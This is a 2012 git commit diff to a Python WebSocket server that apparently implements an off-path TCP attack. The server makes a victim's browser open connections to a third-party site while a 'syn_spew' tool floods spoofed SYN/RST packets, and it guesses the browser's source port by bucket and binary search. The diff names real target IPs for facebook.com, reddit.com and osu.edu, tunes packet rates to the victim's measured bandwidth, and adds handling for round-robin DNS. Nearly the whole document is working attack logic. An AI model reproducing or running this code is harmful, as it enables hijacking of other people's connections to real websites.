2e36e6528a8c5c92d14b46a502b4e8ec820334ea
Eric Wustrow <ewust@tweedledee.(none)>
2012-07-24 06:43:01 -0400

    add support for multiple ip addresses (RR DNS), though this will have to be fixed to deal with RR DNS where each ip has different ping times

--- WebSocketServerFactory.py
+++ WebSocketServerFactory.py
@@ -62,18 +62,34 @@ TEST_VICTIM_IP = '12.168.1.113'
 #VICTIM_SITE = '68.40.51.184'
 #VICTIM_DOMAIN = 'hobocomp.com'
 
-VICTIM_SITE = '192.122.184.99'
-VICTIM_DOMAIN = 'www.reddit.com'
+#VICTIM_SITE = '192.122.184.99'
+#VICTIM_DOMAIN = 'www.reddit.com'
 
-VICTIM_SITE = '140.254.112.210'
-#VICTIM_DOMAIN = 'osu.edu'
-VICTIM_DOMAIN = 'osu.edu/2008/images/home/sprite2.png'
+#VICTIM_SITE = '140.254.112.210'
+#VICTIM_DOMAIN = 'osu.edu/2008/images/home/sprite2.png'
+
+#VICTIM_SITE = '69.171.228.74'
+#VICTIM_DOMAIN = 'www.facebook.com' # TTL = 30
+
+VICTIM_SITE = '69.171.229.11'
+VICTIM_DOMAIN = 'facebook.com' # TTL = 7200, but there are 5 of them
+
+# TODO: loop over all these to figure out which one we are during port
+# guessing...
+VICTIM_SITE_IPS = ['66.220.149.11', '66.220.158.11', '69.171.224.37', \
+                    '69.171.229.11', '69.171.242.11']
 
 NEW_CONNECTION_PERIOD = 0.4
 CONNECTION_TIMEOUT = 30.0
 SPEW_DELAY_US = '100'
 SPEW_TIME_MS  = '500'   # if you don't win the race in the first few seconds, you're not going to
 RTT = 50    # milliseconds
+
+
+STATE_INIT = 1
+STATE_SOURCE_PORT_GUESS = 2
+STATE_SOURCE_PORT_FINAL = 3
+STATE_BW_TEST = 4
 
 class ControlWebSocket(Protocol):
     """
@@ -104,8 +120,12 @@ class ControlWebSocket(Protocol):
         #self.addr.host = TEST_VICTIM_IP
         #subprocess.call(['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
         #                 '-r', '100', '-d', '100', self.addr.host, '69.171.242.11:80'])
-        os.execvp('./syn_spew', ['./syn_spew', '-b', '-p', '%d-%d' % (low_port, high_port), \
-                                '-t', SPEW_TIME_MS, '-d', self.SPEW_DELAY_US, self.addr.host, '%s:80' % (VICTIM_SITE)])
+        guess_ip = VICTIM_SITE_IPS[self.ip_guess_index]
+        (port_a, port_b) = (low_port, high_port)
+        if len(self.votes) > 0:
+            (port_b, port_a) = (low_port, high_port)
+        os.execvp('./syn_spew', ['./syn_spew', '-b', '-p', '%d-%d' % (port_a, port_b), \
+                                '-t', SPEW_TIME_MS, '-d', self.SPEW_DELAY_US, self.addr.host, '%s:80' % (guess_ip)])
         #sys.exit(0)
 
 
@@ -154,13 +174,17 @@ class ControlWebSocket(Protocol):
 
     def make_iframe(self):
         self.transport.write('iframe')
-        self.spawnHTTPSpewer() 
+        #self.spawnHTTPSpewer() 
 
     def adjustBucket(self, success):
         """
         Given the current bucket (self.min_port - self.mid_port), was the browser's source port in there?
         If it was, we'll look in the lower half of that range next, 
         otherwise, it was in self.mid_port - self.max_port
+
+        If the size of our new port bucket is small enough (e.g. fewer than
+        5 ports), we will just repeatedly guess the maximum (without calling
+        incrementBuckets) until we "win".
         """
 
         #self.calls += 1
@@ -170,11 +194,19 @@ class ControlWebSocket(Protocol):
             return
 
         print 'adjust Bucket (%s, %s, %s)' % (self.min_port, self.mid_port, self.max_port)
-        if (self.min_port == self.mid_port):
+
+        if (self.state == STATE_SOURCE_PORT_FINAL):
             if success:
                 port = self.min_port
             else:
-                port = self.max_port
+                self.wrong_final_count += 1
+                if (self.wrong_final_count >= 5):
+                    # oops, browser must have skipped this port..
+                    self.state = STATE_SOURCE_PORT_GUESS
+                    self.min_port = int(self.min_port)
+                    self.max_port = int(self.min_port) + 40
+                    self.mid_port = int(self.min_port) + 20
+                return
             print 'Success!!! we did it! port: %d' % port
             self.transport.write("show <b>Used port %d</b>" % port) 
             
@@ -185,8 +217,7 @@ class ControlWebSocket(Protocol):
 
             #reactor.stop()
             return
-        else:
-            print '(not equal)'
+
 
         if success:
             # Look left
@@ -208,8 +239,16 @@ class ControlWebSocket(Protocol):
             #self.min_port += 1
             #self.mid_port += 1
             #self.max_port += 1
-        
-        self.incrementBuckets()
+
+        if (self.max_port - self.min_port) < 5:
+            print 'Starting to just guess %d' % self.max_port
+            self.min_port = self.mid_port = self.max_port
+            self.state = STATE_SOURCE_PORT_FINAL
+            self.wrong_final_count = 0  # if this gets above 5, we've
+                                    # missed the port, and we'll have to
+                                    # expand our search again
+        else: 
+            self.incrementBuckets()
 
         
 
@@ -264,8 +303,9 @@ class ControlWebSocket(Protocol):
         testing = "testing"
         if self.bucket_search:
             testing = "(bucket) testing"
-        self.transport.write("show <b>%s %d - %d...</b>" % (testing, self.min_port, self.mid_port))
-        self.transport.write("make ws://%s/" % (VICTIM_SITE)) 
+        self.transport.write("show <b>%s %s:%d - %d...</b>" % \
+            (testing, VICTIM_SITE_IPS[self.ip_guess_index], self.min_port, self.mid_port))
+        self.transport.write("make ws://%s/" % (VICTIM_DOMAIN)) 
         #self.transport.write("img %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy.
 
         self.fire_time = time.time()
@@ -274,114 +314,149 @@ class ControlWebSocket(Protocol):
         #self.websocketTimeoutCb = reactor.callLater(CONNECTION_TIMEOUT, self.websocketTimeout)
         
 
-    def dataReceived(self, data):
-        # Received data from the control websocket
+    def killSpewer(self):
+        # Kill spewer, whatever you do! (This is NOT the kind
+        # of process you want to leave running if you can help it...)
+        if self.spewer_pid != None:
+            os.kill(self.spewer_pid, signal.SIGKILL)
+            self.spewer_pid = None
+
+    def handlePortDetectionResult(self, data):
+        # When we are still trying to determine what source port a client is
+        # using. This function determines what our next guesses should be,
+        # given the current information.
         # either we won/lost the race ("timeout"/"closed"), 
-        # or the browser is done initializing ("calmed")
-        if data == 'closed' or data == 'timeout':
+        if not(data == 'closed' or data == 'timeout'):
+            return
 
-            if data == 'closed':
-                we_won = False
-                print 'Lost the race'
-            else:
-                we_won = True
-                print 'Won the race'
+        if data == 'closed':
+            we_won = False
+            print 'Lost the race'
+        else:
+            we_won = True
+            print 'Won the race'
 
-            # Kill spewer, whatever you do! (This is NOT the kind
-            # of process you want to leave running if you can help it...)
-            if self.spewer_pid != None:
-                os.kill(self.spewer_pid, signal.SIGKILL)
-                self.spewer_pid = None
+        self.killSpewer()
 
-            if self.bucket_search:
+        if self.bucket_search:
 
-                self.votes.append(we_won)
+            self.votes.append(we_won)
 
-                if len(self.votes) >= 3:
-                    # count the votes, and use this result to move on
-                    if True in self.votes:
-                        # we won at least one race. Assume our 
-                        # false-positive rate (winning a race we shouldn't have)
-                        # is much less than our false-negative rate (losing when
-                        # we should have won, e.g. dropped packet etc)
-                        we_won = True
-                    else:
-                        we_won = False
-                    self.votes = []
-
-                    if (we_won):
-                        # now we will use binary search
-                        self.bucket_search = False
-    
-                        (self.min_port, self.max_port) = self.getBucketPortRange() 
-                        self.mid_port = (self.min_port + self.max_port) / 2
-                    else:
-                        # we lost, so we're
-                        # still doing a linear search over buckets
-                        self.bucket += 1
-                        if (self.bucket == self.NUM_BUCKETS):
-                            print 'Ah, well that is the game :('
-                            reactor.stop()
-                            return
-
-            else:
-                # Doing binary search
-                self.votes.append(we_won)
-                if len(self.votes) >= 2:
-                    we_won = (True in self.votes)
-                    self.votes = []
-                    self.adjustBucket(we_won)
+            if len(self.votes) >= 2:
+                # count the votes, and use this result to move on
+                if True in self.votes:
+                    # we won at least one race. Assume our 
+                    # false-positive rate (winning a race we shouldn't have)
+                    # is much less than our false-negative rate (losing when
+                    # we should have won, e.g. dropped packet etc)
+                    we_won = True
                 else:
-                    self.incrementBuckets()
+                    we_won = False
+                self.votes = []
 
-            # Fire again
-            if (self.fire_time != None):
-                print 'diff: %f' % (time.time() - self.fire_time)
-                
-            if (self.seq_spew_port == None):
-                reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
-
-        elif data.startswith('calmed'):
-            rtt_secs = float(data[len('calmed '):])
-            self.RTT = int(rtt_secs * 1000)
-            print 'RTT: %f (%d ms)' % (rtt_secs, self.RTT)
-            # The browser has initialized itself and is ready to begin bucket search
-            # But first, we'll do a quick bandwidth test
-            # make the browser download a 10mb file from us and time how long it took
-            # to get it. That gives us a speed at which we can send packets at
-            if (self.fire_time != None):
-                print 'diff: %f' % (time.time() - self.fire_time)
-
-            self.transport.write("bwtest 50mb.dat.jpg")
-
-        elif data.startswith('bwresult'):
-            bwresult = float(data[len('bwresult '):])
-            print 'Took %f seconds to download 10MB' % bwresult
-            bw = float(8*10*1024*1024) / bwresult
-            pps = bw / float(480)
-            pkt_delay = int(1000000.0 / pps)
-            print '%f mbps \n~= %f kpkts/sec \n~= %d us packet delay' % \
-                ((bw/float(1024*1024)), (pps/float(1000)), pkt_delay)
-            
-            self.SPEW_DELAY_US = str(pkt_delay + 5)
+                if (we_won):
+                    # now we will use binary search
+                    self.bucket_search = False
     
-            # now calculate the other way:
-            pps = 1000000.0 / float(self.SPEW_DELAY_US) #packets per second
-            pps /= 2 # have to send both SYN and RST
+                    (self.min_port, self.max_port) = self.getBucketPortRange() 
+                    self.mid_port = (self.min_port + self.max_port) / 2
+                else:
+                    # we lost, so we're
+                    # still doing a linear search over buckets
+                    self.bucket += 1
+                    if (self.bucket == self.NUM_BUCKETS):
+                        print 'Ah, well that is the game :('
+                        self.ip_guess_index += 1
+                        self.ip_guess_index %= len(VICTIM_SITE_IPS)
+                        self.bucket = 0
+                        print 'But wait, there\'s more! (index %d' % self.ip_guess_index 
+
+        else:
+            # Doing binary search
+            self.votes.append(we_won)
+            if len(self.votes) >= 2:
+                we_won = (True in self.votes)
+                self.votes = []
+                self.adjustBucket(we_won)
+            elif self.state == STATE_SOURCE_PORT_FINAL:
+                self.adjustBucket(we_won)
+            else:
+                self.incrementBuckets()
+
+        # Fire again
+        if (self.fire_time != None):
+            print 'diff: %f' % (time.time() - self.fire_time)
+            
+        if (self.seq_spew_port == None):
+            reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
+
+    def handleRTTResult(self, data):
+        # the browser has finished measuring the RTT (and win_threshold)
+        rtt_secs = float(data[len('calmed '):])
+        self.RTT = int(rtt_secs * 1000)
+        print 'RTT: %f (%d ms)' % (rtt_secs, self.RTT)
+        # The browser has initialized itself and is ready to begin bucket search
+        # But first, we'll do a quick bandwidth test
+        # make the browser download a 10mb file from us and time how long it took
+        # to get it. That gives us a speed at which we can send packets at
+        if (self.fire_time != None):
+            print 'diff: %f' % (time.time() - self.fire_time)
+
+        self.transport.write("bwtest 50mb.dat.jpg")
+        self.state = STATE_BW_TEST
+
+  
+    def handleBWResult(self, data):
+        # We use the bandwidth result to determine how many
+        # packets per second we can spew at the browser.
+        bwresult = float(data[len('bwresult '):])
+        print 'Took %f seconds to download 10MB' % bwresult
+        bw = float(8*10*1024*1024) / bwresult
+        pps = bw / float(480)
+        pkt_delay = int(1000000.0 / pps)
+        print '%f mbps \n~= %f kpkts/sec \n~= %d us packet delay' % \
+            ((bw/float(1024*1024)), (pps/float(1000)), pkt_delay)
+        
+        self.SPEW_DELAY_US = str(pkt_delay + 10)
+    
+        # now calculate the other way:
+        pps = 1000000.0 / float(self.SPEW_DELAY_US) #packets per second
+        pps /= 2 # have to send both SYN and RST
 
 
-            port_guesses = float(pps * self.RTT) / 1000.0   # number of ports we can guess per RTT
+        port_guesses = float(pps * self.RTT) / 1000.0   # number of ports we can guess per RTT
+
+        port_guesses *= 0.8  # fudge factor
+        
+        
+        self.NUM_BUCKETS = int((HIGH_PORT - LOW_PORT) / port_guesses + 1)
+        self.PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / self.NUM_BUCKETS
+        print 'moving to %d buckets' % self.NUM_BUCKETS
         
 
-            self.NUM_BUCKETS = int((HIGH_PORT - LOW_PORT) / port_guesses + 1)
-            self.PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / self.NUM_BUCKETS
-            print 'moving to %d buckets' % self.NUM_BUCKETS
-            
 
-            self.votes = []  # We will append to this a set of win/loss (True/False)
-                             # until we get above VOTE_THRESHOLD, then move on to the
-                             # next bucket, to increase reliability.
-            reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
+        self.state = STATE_SOURCE_PORT_GUESS
+        self.votes = []  # We will append to this a set of win/loss (True/False)
+                         # until we get above VOTE_THRESHOLD, then move on to the
+                         # next bucket, to increase reliability.
+        reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
+
+
+
+    def dataReceived(self, data):
+        # Received data from the control websocket
+        # 
+        if self.state == STATE_SOURCE_PORT_GUESS or \
+           self.state == STATE_SOURCE_PORT_FINAL:
+            self.handlePortDetectionResult(data)
+
+        elif self.state == STATE_INIT:
+            self.handleRTTResult(data)
+
+        elif self.state == STATE_BW_TEST:
+            self.handleBWResult(data)
+
+
 
     def connectionMade(self):
         self.bucket_search = True
@@ -391,5 +466,7 @@ class ControlWebSocket(Protocol):
         # for whatever reason when first asked, then calms down and only opens 1
         # (or 2, you never know) to it next time.
         self.fire_time = time.time()
-        self.transport.write("calm ws://%s/" % (VICTIM_SITE)) 
+        self.state = STATE_INIT
+        self.ip_guess_index = 0  # index into VICTIM_SITE_IPS[]
+        self.transport.write("calm ws://%s/" % (VICTIM_DOMAIN)) 
         #self.transport.write("calm %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy. 
